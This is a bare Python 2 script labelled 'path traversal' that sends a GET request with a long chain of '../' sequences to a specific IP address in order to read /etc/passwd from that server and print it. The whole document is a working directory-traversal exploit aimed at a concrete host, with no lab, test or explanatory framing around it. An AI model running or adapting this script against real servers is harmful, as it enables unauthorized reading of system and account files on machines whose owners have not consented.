'''path traversal'''

#!/bin/python

import httplib

conn = httplib.HTTPConnection('61.145.231.44', timeout=20)
conn.request('GET', '/../../../../../../../../../../../../../.././../../etc/passwd')
html_doc = conn.getresponse().read()

print(html_doc)
